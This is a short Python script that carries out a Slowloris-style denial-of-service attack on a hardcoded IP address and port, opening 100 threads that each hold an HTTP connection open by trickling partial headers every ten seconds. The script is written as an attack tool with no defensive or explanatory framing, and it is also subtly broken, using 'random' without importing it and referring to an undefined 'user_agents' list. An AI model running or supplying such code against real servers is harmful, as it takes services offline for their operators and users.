import socket
import time
import threading

target_ip = "212.182.24.27"
target_port = 8080
socket_count = 100

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: {}\r\n".format(user_agents[random.randint(0, len(user_agents)-1)]).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        while True:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            time.sleep(10)

for i in range(socket_count):
    thread = threading.Thread(target=attack)
    thread.start()
